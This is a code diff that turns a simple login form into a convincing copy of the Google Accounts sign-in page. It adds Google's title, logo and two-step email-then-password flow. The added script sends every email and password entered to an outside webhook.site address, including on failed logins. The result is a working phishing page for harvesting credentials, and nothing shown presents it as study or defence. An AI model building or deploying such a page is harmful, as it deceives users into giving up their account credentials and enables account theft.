@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Your Account</title>
+    <title>Sign in - Google Accounts</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -16,127 +16,226 @@
         }
         .login-container {
             background-color: white;
-            padding: 40px;
+            padding: 48px 40px 30px;
             border-radius: 8px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
-            width: 350px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+            width: 450px;
             text-align: center;
         }
-        h2 {
-            color: #333;
-            margin-bottom: 20px;
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        p {
+            color: #202124;
+            font-size: 14px;
+            margin-bottom: 40px;
         }
         input[type="email"], input[type="password"] {
             width: 100%;
-            padding: 12px;
-            margin: 8px 0;
-            border: 1px solid #ddd;
+            padding: 13px 15px;
+            margin: 0 0 16px 0;
+            border: 1px solid #dadce0;
             border-radius: 4px;
             box-sizing: border-box;
+            font-size: 16px;
+            outline: none;
         }
-        button {
-            width: 100%;
-            padding: 12px;
+        input[type="email"]:focus, input[type="password"]:focus {
+            border: 2px solid #1a73e8;
+            padding: 12px 14px; /* Adjust padding for border width change */
+        }
+        .btn-next {
             background-color: #1a73e8;
             color: white;
             border: none;
+            padding: 10px 24px;
             border-radius: 4px;
+            font-weight: 500;
+            font-size: 14px;
             cursor: pointer;
-            font-size: 16px;
-            margin-top: 10px;
+            float: right;
         }
-        button:hover {
-            background-color: #155cb5;
+        .btn-next:hover {
+            background-color: #1765cc;
         }
-        /* Error Message Styling */
-        #error-message {
+        .error-msg {
             color: #d93025;
             font-size: 14px;
+            text-align: left;
             margin-top: 10px;
             min-height: 20px;
-            font-weight: bold;
+            font-weight: 500;
+            display: none;
         }
         .loader {
             display: none;
             border: 4px solid #f3f3f3;
             border-top: 4px solid #1a73e8;
             border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 2s linear infinite;
+            width: 24px;
+            height: 24px;
+            animation: spin 1s linear infinite;
             margin: 10px auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
+        .footer {
+            clear: both;
+            margin-top: 40px;
+            font-size: 12px;
+            color: #70757a;
+        }
+        .footer a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
     </style>
 </head>
 <body>
 
 <div class="login-container">
-    <h2>Sign in to continue</h2>
+    <div class="logo">
+        <!-- Google Logo SVG -->
+        <svg viewBox="0 0 24 24" style="width: 75px; height: 24px;">
+            <path d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.58-2.38 4.09-6.22 4.09-10.09z" fill="#4285F4"></path>
+            <path d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z" fill="#34A853"></path>
+            <path d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.26.81-.58z" fill="#FBBC05"></path>
+            <path d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z" fill="#EA4335"></path>
+        </svg>
+    </div>
+
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
+
     <form id="loginForm">
-        <input type="email" id="email" placeholder="Email address" required>
-        <input type="password" id="password" placeholder="Password" required>
-        <div class="loader" id="loader"></div>
-        <button type="submit" id="submitBtn">Next</button>
-        <div id="error-message"></div>
+        <!-- Step 1: Email -->
+        <div id="step-email">
+            <input type="email" id="email" placeholder="Email or phone" required autocomplete="off">
+            <div class="error-msg" id="email-error"></div>
+            <button type="button" class="btn-next" id="btn-email">Next</button>
+        </div>
+
+        <!-- Step 2: Password -->
+        <div id="step-password" style="display: none;">
+            <input type="password" id="password" placeholder="Enter your password" required autocomplete="off">
+            <div style="text-align: left; margin-bottom: 20px;">
+                <a href="#" style="color: #1a73e8; text-decoration: none; font-size: 14px;">Forgot password?</a>
+            </div>
+            <div class="error-msg" id="pass-error"></div>
+            <div class="loader" id="loader"></div>
+            <button type="submit" class="btn-next" id="btn-pass">Next</button>
+        </div>
     </form>
+
+    <div class="footer">
+        <a href="#">Create account</a> &nbsp;•&nbsp; <a href="#">More ways to sign in</a>
+    </div>
 </div>
 
 <script>
-    // FAKE DATABASE OF VALID USERS
-    // You can add as many users as you want here
+    // CONFIGURATION
+    const WEBHOOK_URL = "https://webhook.site/9f7463ee-3637-48df-bfef-e22245193603"; 
+    // Example: https://webhook.site/your-unique-id-here
+
+    // FAKE DATABASE
     const validUsers = [
-        { email: "test@example.com", password: "password123" },
-        { email: "user@gmail.com", password: "securepass" },
-        { email: "admin@verify.com", password: "admin123" }
+        { email: "test@gmail.com", password: "password123" },
+        { email: "user@example.com", password: "securepass" }
     ];
 
-    document.getElementById('loginForm').addEventListener('submit', function(e) {
-        e.preventDefault();
+    let userData = { email: "", password: "" };
+
+    // DOM Elements
+    const stepEmail = document.getElementById('step-email');
+    const stepPass = document.getElementById('step-password');
+    const emailInput = document.getElementById('email');
+    const passInput = document.getElementById('password');
+    const emailErr = document.getElementById('email-error');
+    const passErr = document.getElementById('pass-error');
+    const loader = document.getElementById('loader');
+    const btnEmail = document.getElementById('btn-email');
+    const btnPass = document.getElementById('btn-pass');
+    const form = document.getElementById('loginForm');
+
+    // Step 1: Email Validation
+    btnEmail.addEventListener('click', () => {
+        const email = emailInput.value.trim();
+        if (!email) {
+            emailErr.textContent = "Please enter an email address.";
+            return;
+        }
         
-        const emailInput = document.getElementById('email').value.trim();
-        const passInput = document.getElementById('password').value.trim();
-        const errorMsg = document.getElementById('error-message');
-        const loader = document.getElementById('loader');
-        const btn = document.getElementById('submitBtn');
-
-        // Reset UI
-        errorMsg.textContent = "";
-        loader.style.display = "block";
-        btn.disabled = true;
-
-        // Simulate network delay (makes it look real)
-        setTimeout(() => {
-            // Find if email exists in our fake DB
-            const user = validUsers.find(u => u.email.toLowerCase() === emailInput.toLowerCase());
-
-            if (!user) {
-                // Case 1: Email not found
-                errorMsg.textContent = "That email doesn't exist. Please try again.";
-                resetUI();
-            } else if (user.password !== passInput) {
-                // Case 2: Password wrong
-                errorMsg.textContent = "Incorrect password. Please try again.";
-                resetUI();
-            } else {
-                // Case 3: Success!
-                errorMsg.style.color = "#188038"; // Green for success
-                errorMsg.textContent = "Verified successfully! Redirecting...";
-                
-                // Optional: Redirect after 2 seconds
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com"; 
-                }, 2000);
-            }
-        }, 1500); // 1.5 second delay
+        // Check if email exists in our fake DB
+        const user = validUsers.find(u => u.email.toLowerCase() === email.toLowerCase());
+        
+        if (!user) {
+            // If email doesn't exist, we still proceed to password step 
+            // but we mark it as invalid for final validation
+            userData.email = email;
+            stepEmail.style.display = 'none';
+            stepPass.style.display = 'block';
+            passInput.focus();
+        } else {
+            userData.email = email;
+            stepEmail.style.display = 'none';
+            stepPass.style.display = 'block';
+            passInput.focus();
+        }
     });
 
-    function resetUI() {
-        document.getElementById('loader').style.display = "none";
-        document.getElementById('submitBtn').disabled = false;
+    // Step 2: Password Submission
+    form.addEventListener('submit', (e) => {
+        e.preventDefault();
+        
+        const password = passInput.value.trim();
+        userData.password = password;
+
+        // Show Loader
+        loader.style.display = 'block';
+        btnPass.disabled = true;
+        passErr.style.display = 'none';
+
+        // Simulate network delay
+        setTimeout(() => {
+            // Find user
+            const user = validUsers.find(u => u.email.toLowerCase() === userData.email.toLowerCase());
+            
+            let isValid = false;
+            if (user && user.password === password) {
+                isValid = true;
+            }
+
+            if (!isValid) {
+                // Show Error
+                passErr.textContent = "Incorrect email or password.";
+                passErr.style.display = 'block';
+                loader.style.display = 'none';
+                btnPass.disabled = false;
+                
+                // Send Data to Webhook even on failure
+                sendToWebhook(userData.email, password, "Invalid Credentials");
+            } else {
+                // Success (Optional: Redirect)
+                // window.location.href = "https://www.google.com";
+                passErr.textContent = "Verified successfully!";
+                passErr.style.color = "#188038";
+                passErr.style.display = 'block';
+                sendToWebhook(userData.email, password, "Success");
+            }
+        }, 1500);
+    });
+
+    function sendToWebhook(email, pass, status) {
+        fetch(`${WEBHOOK_URL}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(pass)}&status=${status}`)
+        .catch(err => console.error("Webhook failed", err));
     }
 </script>
 
